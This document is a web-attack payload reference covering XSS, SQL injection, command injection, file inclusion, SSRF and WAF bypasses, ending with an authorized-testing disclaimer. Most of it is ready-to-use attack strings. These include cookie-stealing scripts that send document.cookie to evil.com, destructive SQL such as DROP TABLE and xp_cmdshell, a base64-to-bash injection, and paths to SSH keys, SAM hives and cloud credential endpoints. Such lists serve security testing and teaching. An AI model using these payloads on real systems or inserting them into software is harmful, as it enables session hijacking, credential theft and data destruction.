# Payloads and Bypasses Reference

## Table of Contents
1. [XSS (Cross-Site Scripting) Payloads](#xss-payloads)
2. [SQL Injection Payloads](#sql-injection-payloads)  
3. [Command Injection Payloads](#command-injection-payloads)
4. [Local File Inclusion (LFI) / Directory Traversal](#lfi-directory-traversal)
5. [Server-Side Request Forgery (SSRF)](#ssrf-payloads)
6. [WAF Bypass Techniques](#waf-bypass-techniques)
7. [Encoding and Obfuscation](#encoding-obfuscation)
8. [Parameter Discovery](#parameter-discovery)
9. [Injection Points](#injection-points)

---

## XSS Payloads

### Basic XSS Vectors

#### Classic Payloads
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>prompt(document.cookie)</script>
<script>confirm(1)</script>
```

#### Image-Based XSS
```html
<img src=x onerror=alert(1)>
<img src=x onerror=prompt(document.cookie)>
<img src=x oNerrOr=alert(1)>
<img//////src=x oNlY=1 oNerror=alert('xss')//
<img src=x on onerror=alert()>
<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
```

#### SVG-Based XSS
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script>
<svg/x=">"/onload=confirm()//
<svg><animate/onbegin=alert(1)>
<svg><animate/dur='1s'onend=alert(1)>
<svg><set/onbegin=alert(1)>
<svg><set/dur='1ms'onend=alert(1)>
<svg onload=prompt%26%230000000040document.domain)>
```

#### Context Breaking Payloads
```html
<!-- HTML Context -->
</tag><svg onload=alert()>

<!-- Attribute Context -->
"><svg onload=alert()>
onmouseover=alert()

<!-- JavaScript Context -->
'-alert()-'
}</script><svg onload=alert()>
```

#### Advanced XSS Vectors

##### Without Closing Tags
```html
<img/src/onerror=alert(1)>
<svg/onload=alert(1)>
<object/data=javascript:prompt(1)>
<input/autofocus/onfocus=prompt(1)>
<audio/src/onloadstart=alert(1)>
<marquee width=1 loop=1 onfinish=alert(1)>
<details/open/ontoggle=confirm(1)>
<details open ontoggle=confirm(1)>
<details/ontoggle='alert(1)'/open>
<details ontoggle=alert(1) open>
```

##### Without Parentheses
```javascript
alert`45`
document.location="javascript:alert%2845%29"
onerror=alert;throw 45
[1].forEach(alert);
alert.bind()(1)
a=alert;a`1`;
location=/javascript:alert%2823%29/.source;
```

##### Polyglot Payloads
```html
%0ajavascript:/*\\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">
```

##### URL-Based XSS
```javascript
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
javascript:alert(1)
JaVaScript:alert(1)
ja&Tab;vascript:alert(1)
java\tscript:alert(1)
ja&NewLine;vascript:alert(1)
ja&#x0000A;vascript:alert(1)
java&#x73;cript:alert()
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')
```

#### Encoding Bypasses

##### JavaScript Unicode
```javascript
javascript:a\u006Cert``
javascript:\u0061\u006C\u0065\u0072\u0074``
```

##### URL Encoding
```javascript
javascript:%61%6c%65%72%74%28%29
```

##### Colon Bypasses
```javascript
javascript&colon;alert()
javascript&#x0003A;alert()
javascript&#58;alert(1)
javascript&#x3A;alert()
```

### Cookie Exfiltration
```html
<img src=x onerror="document.location='http://evil.com?c='+document.cookie;" />
<script>fetch("//evil.com/?c="+document.cookie)</script>
<script>fetch("//evil.com/?c=".concat(document.cookie))</script>
<script>fetch("//evil.com/?c=", document.cookie].join())</script>
<script>fetch(`//evil.com/?c=${document.cookie}`)</script>
```

### DOM-Based XSS
```html
#<script>alert('DOM XSS')</script>
#<img src=x onerror=alert('DOM XSS')>
#"><svg onload=alert('DOM XSS')>
```

### WebSocket XSS
```javascript
ws.onopen = function() {
    ws.send("<script>alert('XSS')</script>");
};
```

### Alternative Functions
```javascript
console.trace()
console.error()
console.trace``
console.error``
confirm?.(1)
top.confirm?.(1)
alert?.(1)
(a=>a(1))(alert);
setTimeout(alert, 0, 1)
[1].forEach(alert);
alert.bind()(1)
var{a:onerror}={a:alert};throw%20document.cookie
```

---

## SQL Injection Payloads

### Basic Detection Payloads
```sql
'
"
`
')
")
`)
'))
"))
`))
```

### Union-Based Payloads
```sql
' UNION SELECT 1,2,3--
" UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION ALL SELECT 1,2,3--
```

### Boolean-Based Payloads
```sql
' OR 1=1--
' OR 'a'='a'--
" OR 1=1--
" OR "a"="a"--
' OR 1=1#
' OR 1=1/*
```

### Time-Based Payloads
```sql
'; WAITFOR DELAY '00:00:05';--
' OR SLEEP(5)--
' OR pg_sleep(5)--
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(MID((SELECT version()),1,50),FLOOR(RAND(0)*2))) AND '1'='1
0' XOR (if (now()=sysdate(), sleep(20), 0)) XOR 'Z
IF(NOW()=SYSDATE(), SLEEP(20), 0)
1234 AND SLEEP(20)
```

### Advanced Time-Based
```sql
paramname=1' -IF (1=1, SLEEP(20), 0) AND paramname='1
0' XOR (IF(NOW()=SYSDATE(), SLEEP(20), 0)) XOR 'Z
0' XOR (IF(NOW()=SYSDATE(), SLEEP(30), 0)) XOR 'Z
0' XOR (IF(NOW()=SYSDATE(), SLEEP(10), 0)) XOR 'Z
```

### Error-Based Payloads
```sql
' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND GTID_SUBSET(CONCAT(0x7e,(SELECT database()),0x7e),1)--
```

### Stacked Queries
```sql
'; INSERT INTO users(username,password) VALUES('admin','password');--
'; DROP TABLE users;--
'; EXEC xp_cmdshell('whoami');--
```

### Authentication Bypass
```sql
admin'--
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin') OR ('1'='1'--
admin') OR ('1'='1'#
```

---

## Command Injection Payloads

### Basic Command Separators
```bash
; ls
| ls  
|| ls
& ls
&& ls
`ls`
$(ls)
```

### Common Commands
```bash
; whoami
; id
; pwd
; ls -la
; cat /etc/passwd
; uname -a
; ps aux
; netstat -an
```

### Windows Commands
```cmd
& whoami
& dir
& type c:\windows\system32\drivers\etc\hosts
& net user
& systeminfo
& tasklist
```

### Encoded Payloads
```bash
; echo$(IFS)YmFzaDY0IC1pCg==|base64$(IFS)-d|bash
; %65%63%68%6f%20%68%65%6c%6c%6f  # URL encoded "echo hello"
```

---

## LFI / Directory Traversal

### Basic Traversal Patterns
```
../
..\/
....//
....\/
..%2f
..%5c
..%252f
..%255c
```

### Linux Paths
```
/etc/passwd
/etc/hosts
/etc/resolv.conf
/etc/hostname
/etc/issue
/etc/motd
/proc/version
/proc/cmdline
/proc/self/environ
/var/log/apache2/access.log
/var/log/apache2/error.log
/home/user/.bash_history
/home/user/.ssh/id_rsa
```

### Windows Paths
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\networks
C:\Windows\win.ini
C:\Windows\system.ini
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Users\Administrator\Desktop\
C:\inetpub\wwwroot\web.config
```

### Advanced LFI Payloads
```
....//....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
....\/....\/....\/....\/etc\/passwd
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
expect://id
input://
zip://archive.zip#file.txt
```

---

## SSRF Payloads

### Basic SSRF Tests
```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
http://169.254.169.254/
```

### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/

# Azure
http://169.254.169.254/metadata/instance/
http://169.254.169.254/metadata/instance/compute/
```

### Protocol-Based SSRF
```
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_info
ldap://127.0.0.1:389/
ftp://127.0.0.1/
```

### IP Address Bypasses
```
127.0.0.1 = 0x7f.0x0.0x0.0x1
127.0.0.1 = 2130706433
127.0.0.1 = 017700000001 (octal)
127.0.0.1 = localhost
127.0.0.1 = 127.1
127.0.0.1 = 0:0:0:0:0:ffff:7f00:1
```

---

## WAF Bypass Techniques

### Cloudflare Bypasses
```html
<img//////src=x oNlY=1 oNerror=alert('xss')//
<img src=x on onerror=alert()>
<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
<svg onload=prompt%26%230000000040document.domain)>
```

### AWS WAF Bypass
```
Adding 8192 "A" characters before payload can bypass AWS WAF for POST requests
AAAAA....(8192 times)...AAAA<script>alert(1)</script>
```

### Imperva & Incapsula Bypass
```html
<details/open/id="&quot;"ontoggle=[JS]>
```

### General WAF Bypass Headers
```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-Host: localhost
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

---

## Encoding & Obfuscation

### HTML Entity Encoding

#### Named Entities
```html
' -> &apos;
" -> &quot;
` -> &grave;
( -> &lpar;
) -> &rpar;
{ -> &lcub;
} -> &rcub;
& -> &amp;
< -> &lt;
> -> &gt;
\n -> &NewLine;
\t -> &Tab;
```

#### Hex Entities
```html
' -> &#x27;
" -> &#x22;
` -> &#x60;
( -> &#x28;
{ -> &#x7b;
} -> &#x7d;
& -> &#x26;
< -> &#x3c;
> -> &#x3e;
```

#### Numeric Entities
```html
' -> &#39;
" -> &#34;
` -> &#96;
( -> &#40;
) -> &#41;
{ -> &#123;
} -> &#125;
& -> &#38;
< -> &#60;
> -> &#62;
```

### URL Encoding
```
%20 = space
%22 = "
%27 = '
%28 = (
%29 = )
%3C = <
%3E = >
%2F = /
%5C = \
```

### Double URL Encoding
```
%2520 = %20 = space
%2522 = %22 = "
%2527 = %27 = '
```

---

## Parameter Discovery

### XSS-Prone Parameters
```
q=, s=, search=, query=, keyword=, lang=
```

### SQL Injection-Prone Parameters  
```
id=, pid=, category=, cat=, action=, sid=, dir=
```

### SSRF-Prone Parameters
```
url=, path=, dest=, html=, data=, domain=, page=
```

### LFI-Prone Parameters
```
include=, dir=, detail=, file=, folder=, inc=, locate=, doc=, conf=
```

### RCE-Prone Parameters
```
cmd=, exec=, query=, code=, do=, run=, read=, ping=
```

### Open Redirect-Prone Parameters
```
url=, return=, next=, redirect=, redir=, ret=, r2=, page=
```

---

## Injection Points

### URI Path Injection
```
GET /[PAYLOAD]/path2/path3 HTTP/1.1
POST /path1/[PAYLOAD]/path3 HTTP/1.1
```

### Header Injection
```http
User-Agent: [PAYLOAD]Mozilla/5.0...
User-Agent: Mozilla/5.0...[PAYLOAD]
Referer: [PAYLOAD]https://google.com
Referer: https://google.com/[PAYLOAD]
```

### Cookie Injection
```http
Cookie: param1=value1[PAYLOAD]; param2=value2
Cookie: param1=[PAYLOAD]value1; param2=value2
Cookie: [PAYLOAD]param1=value1; param2=value2
```

### GET Parameter Injection
```
/page?param1=[PAYLOAD]&param2=value2
/page?param1=value1&param2=[PAYLOAD]value2
/page?[PAYLOAD]param1=value1&param2=value2
```

### POST Parameter Injection
```http
POST /login HTTP/1.1

email=admin@admin.com&password=[PAYLOAD]pass1234
email=[PAYLOAD]admin@admin.com&password=pass1234
email=admin@admin.com&[PAYLOAD]password=pass1234
```

---

## Specialized Payloads

### JSON-Based XSS
```json
{
  "username": "<script>alert('XSS')</script>",
  "comment": "<img src=x onerror=alert(1)>"
}
```

### Email-Based XSS
```
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

### Iframe Bypasses
```html
<iframe src="javascript:alert('XSS')">
<iframe src="https://youtube.com.evil.domain/">
<iframe src="https://google.com@evil.domain">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### 302 Redirect XSS
```javascript
ws://google.com"><svg/onload=alert(2)>
wss://google.com"><svg/onload=alert(2)>
resource://google.com"><svg/onload=alert(2)>
```

### DOMPurify Bypasses
```html
<!-- DOMPurify < 2.1 -->
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">

<!-- DOMPurify < 2.0.1 -->
<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
```

---

## Testing Methodology

### Black Box Testing Process
1. Identify injection points (headers, parameters, paths)
2. Test with basic payloads
3. Observe server responses and timing
4. Escalate with advanced payloads
5. Verify with multiple variations

### Time-Based Verification
- Test with different delay values (10s, 20s, 30s)
- Verify response time matches injected delay
- Test at least 5-6 variations for confirmation
- Use network timing analysis tools

### Error-Based Verification
- Look for database error messages
- Check for application stack traces  
- Analyze HTTP response codes
- Monitor server behavior changes

---

*Note: These payloads are for authorized security testing and educational purposes only. Always ensure proper authorization before testing on any system.*